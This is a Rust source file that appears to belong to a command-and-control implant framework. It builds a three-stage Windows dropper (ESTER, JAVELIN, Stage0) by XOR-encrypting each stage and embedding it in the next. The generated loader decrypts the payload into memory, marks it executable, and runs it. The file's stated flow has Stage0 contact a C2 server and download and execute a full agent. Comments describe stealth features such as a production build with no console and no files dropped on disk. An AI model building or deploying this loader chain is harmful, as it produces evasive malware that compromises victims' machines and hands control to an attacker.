//! Multi-Stage Builder - Builds the complete ESTER → JAVELIN → Stage0 pipeline
//!
//! This module implements the iterative build process:
//! 1. Compile Stage0 → Convert to shellcode (donut) → Encrypt → Embed in JAVELIN source
//! 2. Compile JAVELIN (with Stage0) → Convert to shellcode (donut) → Encrypt → Embed in ESTER source
//! 3. Compile ESTER (with JAVELIN) → Final executable
//!
//! Each stage is encrypted with a unique XOR key for security
//! 
//! **Key improvement**: Uses donut to convert EXEs to position-independent shellcode
//! so they can be executed directly in memory without a PE loader.

use crate::dll_encrypt::{generate_random_key, xor_encrypt};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Configuration for multi-stage build
pub struct StageConfig {
    /// C2 server address (IP:PORT)
    pub server_address: String,
    /// Production mode (stealthy, no console)
    pub production: bool,
    /// Output directory for artifacts
    pub output_dir: PathBuf,
}

/// Builds the complete multi-stage system
pub fn build_staged_system(config: StageConfig) -> Result<PathBuf, Box<dyn std::error::Error>> {
    println!("╔════════════════════════════════════════╗");
    println!("║   Multi-Stage Builder (ESTER→JAVELIN→Stage0)   ║");
    println!("╚════════════════════════════════════════╝");
    println!();
    
    // Ensure output directory exists
    fs::create_dir_all(&config.output_dir)?;
    
    // Phase 1: Build Stage0
    println!("📦 [1/3] Building Stage0 (Bootstrap Payload)...");
    let stage0_binary = build_stage0(&config)?;
    println!("✅ Stage0 compiled: {} bytes", stage0_binary.len());
    
    // Phase 2: Build JAVELIN with embedded Stage0
    println!("\n📦 [2/3] Building JAVELIN with embedded Stage0...");
    let stage0_key = generate_random_key(32);
    let javelin_binary = build_javelin_with_stage0(&config, &stage0_binary, &stage0_key)?;
    println!("✅ JAVELIN compiled: {} bytes", javelin_binary.len());
    
    // Phase 3: Build ESTER with embedded JAVELIN
    println!("\n📦 [3/3] Building ESTER with embedded JAVELIN...");
    let javelin_key = generate_random_key(32);
    let ester_path = build_ester_with_javelin(&config, &javelin_binary, &javelin_key)?;
    println!("✅ ESTER compiled: {}", ester_path.display());
    
    println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("✨ Multi-stage system built successfully!");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("\n📋 Execution flow:");
    println!("   1. ester.exe validates environment");
    println!("   2. Decrypts and loads JAVELIN in memory");
    println!("   3. JAVELIN decrypts and loads Stage0 in memory");
    println!("   4. Stage0 contacts C2 at {}", config.server_address);
    println!("   5. Downloads and executes full agent");
    
    Ok(ester_path)
}

/// Builds Stage0 binary
fn build_stage0(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Update Stage0 config with C2 server address
    update_stage0_config(&config.server_address)?;
    
    // Determine features
    let features = if config.production { "production" } else { "dev" };
    
    // Build Stage0
    let status = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--target", "x86_64-pc-windows-msvc",
            "--package", "stage0",
            "--features", features,
        ])
        .status()?;
    
    if !status.success() {
        return Err("Failed to build Stage0".into());
    }
    
    // Read the compiled binary
    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/stage0.exe");
    let binary = fs::read(binary_path)?;
    
    Ok(binary)
}

/// Updates Stage0 configuration with C2 server address
fn update_stage0_config(server: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_content = format!(
        r#"//! Configuration for Stage0
//!
//! Contains the C2 server address and session parameters

/// C2 server address (configured by builder)
/// Format: "IP:PORT"
pub const C2_SERVER: &str = "{}";

/// Gets the C2 server address
pub fn get_c2_server() -> &'static str {{
    C2_SERVER
}}

/// Session configuration
pub struct SessionConfig {{
    /// Connection timeout in seconds
    pub timeout: u64,
    /// Maximum retry attempts
    pub max_retries: u32,
    /// Retry delay in seconds
    pub retry_delay: u64,
}}

impl Default for SessionConfig {{
    fn default() -> Self {{
        Self {{
            timeout: 30,
            max_retries: 3,
            retry_delay: 5,
        }}
    }}
}}

/// Configuration marker for binary patching
#[used]
#[no_mangle]
pub static STAGE0_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE0_CONFIG_MARKER___\0\0\0\0";
"#,
        server
    );
    
    fs::write("stages/stage0/src/config.rs", config_content)?;
    Ok(())
}

/// Builds JAVELIN with embedded encrypted Stage0
fn build_javelin_with_stage0(
    config: &StageConfig,
    stage0_binary: &[u8],
    key: &[u8],
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Encrypt Stage0
    let encrypted_stage0 = xor_encrypt(stage0_binary, key);
    
    // Update JAVELIN loader with encrypted payload
    update_javelin_loader(&encrypted_stage0, key)?;
    
    // Determine features
    let features = if config.production { "production" } else { "dev" };
    
    // Build JAVELIN
    let status = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--target", "x86_64-pc-windows-msvc",
            "--package", "javelin",
            "--features", features,
        ])
        .status()?;
    
    if !status.success() {
        return Err("Failed to build JAVELIN".into());
    }
    
    // Read the compiled binary
    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/javelin.exe");
    let binary = fs::read(binary_path)?;
    
    Ok(binary)
}

/// Updates JAVELIN loader configuration with encrypted Stage0
fn update_javelin_loader(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // Generate Rust byte array literal
    let payload_literal = format_byte_array(encrypted_payload);
    let key_literal = format_byte_array(key);
    
    let loader_content = format!(
        r#"//! Stage 3 loader - Loads and executes Stage0 (the bootstrap payload)
//!
//! This is the core functionality of JAVELIN

use crate::crypto::{{decrypt_payload, CryptoAlgorithm}};
use crate::memory::{{allocate_rw, cleanup_memory, transition_rx}};
use std::error::Error;

/// Embedded Stage 3 (Stage0) payload - encrypted
///
/// This is the bootstrap payload that will:
/// - Contact the C2 server
/// - Perform key exchange
/// - Download the full agent
///
/// Generated by the builder and embedded at compile time
const ENCRYPTED_STAGE0: &[u8] = &{};

/// XOR key for Stage0 decryption
/// Generated randomly for each build
const STAGE0_XOR_KEY: &[u8] = &{};

/// Loads and executes Stage 3 (Stage0)
///
/// **Execution flow**:
/// 1. Decrypt Stage0 payload
/// 2. Allocate RW memory
/// 3. Copy payload to memory
/// 4. Transition memory to RX
/// 5. Execute Stage0
/// 6. Clean up artifacts
///
/// # Returns
///
/// * `Ok(())` - Stage0 executed successfully
/// * `Err(_)` - Failed to load or execute Stage0
pub fn load_stage3() -> Result<(), Box<dyn Error>> {{
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Loading Stage 3 (Stage0)...");

    // Check if we have a payload
    if ENCRYPTED_STAGE0.len() <= 1 {{
        return Err("No Stage0 payload embedded".into());
    }}

    // Step 1: Decrypt Stage0
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Decrypting Stage0 ({{}} bytes)", ENCRYPTED_STAGE0.len());
    
    let decrypted = decrypt_payload(ENCRYPTED_STAGE0, STAGE0_XOR_KEY, CryptoAlgorithm::Xor)?;

    // Step 2: Allocate RW memory
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Allocating {{}} bytes as RW", decrypted.len());
    
    let region = allocate_rw(decrypted.len())?;

    // Step 3: Copy payload to memory
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Copying payload to memory");
    
    unsafe {{
        std::ptr::copy_nonoverlapping(
            decrypted.as_ptr(),
            region.address(),
            decrypted.len(),
        );
    }}

    // Step 4: Transition to RX
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Transitioning memory to RX");
    
    transition_rx(&region)?;

    // Step 5: Execute Stage0
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Executing Stage0");
    
    unsafe {{
        // Cast memory to function pointer
        // Stage0 is expected to be position-independent code
        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
        stage0_entry();
    }}

    // Step 6: Cleanup
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Cleaning up memory");
    
    cleanup_memory(&region);

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Stage0 execution complete");

    Ok(())
}}

/// Alternative loader that accepts Stage0 as a parameter
///
/// Useful for download-based staging where Stage0 is fetched remotely
///
/// # Arguments
///
/// * `encrypted_payload` - The encrypted Stage0 payload
/// * `key` - Decryption key
/// * `algorithm` - Decryption algorithm to use
///
/// # Returns
///
/// * `Ok(())` - Stage0 executed successfully
/// * `Err(_)` - Failed to load or execute Stage0
pub fn load_stage3_from_bytes(
    encrypted_payload: &[u8],
    key: &[u8],
    algorithm: CryptoAlgorithm,
) -> Result<(), Box<dyn Error>> {{
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Loading Stage3 from provided bytes");

    // Decrypt
    let decrypted = decrypt_payload(encrypted_payload, key, algorithm)?;

    // Allocate and execute (same as embedded version)
    let region = allocate_rw(decrypted.len())?;

    unsafe {{
        std::ptr::copy_nonoverlapping(decrypted.as_ptr(), region.address(), decrypted.len());
    }}

    transition_rx(&region)?;

    unsafe {{
        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
        stage0_entry();
    }}

    cleanup_memory(&region);

    Ok(())
}}

#[cfg(test)]
mod tests {{
    use super::*;

    #[test]
    fn test_load_with_empty_payload() {{
        // Should fail gracefully when no payload is embedded
        let result = load_stage3();
        assert!(result.is_err());
        
        if let Err(e) = result {{
            assert!(e.to_string().contains("No Stage0 payload"));
        }}
    }}
}}
"#,
        payload_literal, key_literal
    );
    
    fs::write("stages/javelin/src/loader.rs", loader_content)?;
    Ok(())
}

/// Builds ESTER with embedded encrypted JAVELIN
fn build_ester_with_javelin(
    config: &StageConfig,
    javelin_binary: &[u8],
    key: &[u8],
) -> Result<PathBuf, Box<dyn std::error::Error>> {
    // Encrypt JAVELIN
    let encrypted_javelin = xor_encrypt(javelin_binary, key);
    
    // Update ESTER config with encrypted payload
    update_ester_config(&encrypted_javelin, key)?;
    
    // Determine features
    let features = if config.production { "production" } else { "dev" };
    
    // Build ESTER
    let status = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--target", "x86_64-pc-windows-msvc",
            "--package", "ester",
            "--features", features,
        ])
        .status()?;
    
    if !status.success() {
        return Err("Failed to build ESTER".into());
    }
    
    // Copy to output directory
    let source_path = Path::new("target/x86_64-pc-windows-msvc/release/ester.exe");
    let dest_path = config.output_dir.join("ester.exe");
    fs::copy(source_path, &dest_path)?;
    
    Ok(dest_path)
}

/// Updates ESTER configuration with encrypted JAVELIN
fn update_ester_config(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // Generate Rust byte array literals
    let payload_literal = format_byte_array(encrypted_payload);
    let key_literal = format_byte_array(key);
    
    let config_content = format!(
        r#"//! Configuration for Stage 1 (ESTER)
//!
//! This module contains embedded configuration for triggering Stage 2.
//! The JAVELIN payload is embedded here in encrypted form.

/// Embedded JAVELIN (Stage 2) payload - XOR encrypted
/// This is generated by the builder and embedded at compile time
/// 
/// **Why embedded here**:
/// - Allows ESTER to trigger JAVELIN without network activity
/// - Single executable deployment
/// - No suspicious file drops on disk
pub const ENCRYPTED_JAVELIN: &[u8] = &{};

/// XOR key for decrypting JAVELIN payload
/// Generated randomly for each build by the builder
pub const JAVELIN_XOR_KEY: &[u8] = &{};

/// Alternative: Stage 2 location for download-based staging
/// If ENCRYPTED_JAVELIN is empty, ESTER can download Stage 2 from this URL
/// This is less stealthy but provides flexibility
pub const JAVELIN_DOWNLOAD_URL: &str = "";

/// Configuration marker for binary patching
#[used]
#[no_mangle]
pub static STAGE_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE1_CONFIG_MARKER___\0\0\0\0";
"#,
        payload_literal, key_literal
    );
    
    fs::write("stages/ester/src/config.rs", config_content)?;
    Ok(())
}

/// Formats a byte array as a Rust literal
fn format_byte_array(bytes: &[u8]) -> String {
    if bytes.is_empty() {
        return "[]".to_string();
    }
    
    let mut result = String::from("[\n");
    for chunk in bytes.chunks(16) {
        result.push_str("    ");
        for (i, byte) in chunk.iter().enumerate() {
            if i > 0 {
                result.push_str(", ");
            }
            result.push_str(&format!("0x{:02x}", byte));
        }
        result.push_str(",\n");
    }
    result.push_str("]");
    result
}
